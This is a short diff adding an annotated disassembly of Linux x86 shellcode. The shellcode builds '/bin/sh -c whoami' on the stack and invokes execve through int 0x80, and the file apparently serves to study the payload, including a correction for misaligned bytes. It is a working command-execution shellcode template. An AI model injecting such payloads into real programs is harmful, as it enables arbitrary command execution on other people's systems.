@@ -1,0 +1,20 @@
+00000000  6A0B              push byte +0xb		; PUSH 0xb (= 11 | sys_execve) on stack
+00000002  58                pop eax			; POP 0xb into EAX
+00000003  99                cdq				; Clear EDX
+00000004  52                push edx			; PUSH 0 on stack
+00000005  66682D63          push word 0x632d		; PUSH "-c" on stack
+00000009  89E7              mov edi,esp			; EDI points to args on stack
+0000000B  682F736800        push dword 0x68732f		; PUSH "/sh" on stack
+00000010  682F62696E        push dword 0x6e69622f	; PUSH "/bin" on stack
+00000015  89E3              mov ebx,esp			; EBX points to args on stack
+00000017  52                push edx			; PUSH 0 on stack
+00000018  E807000000        call dword 0x24		; pointer to command ("whoami")
+							; verify with: echo -ne "\x07\x00\x00\x00\x77\x68\x6f\x61\x6d\x69\x00"
+
+; From here the original instructions were incorrent.
+; These can be corrected with: echo -ne "\x57\x53\x89\xe1\xcd\x80" | ndisasm -u -
+
+00000000  57                push edi			; PUSH pointer to "-c" on stack
+00000001  53                push ebx			; PUSH pointer to "/bin/sh" on stack
+00000002  89E1              mov ecx,esp			; ECX points to args on stack
+00000004  CD80              int 0x80			; syscall
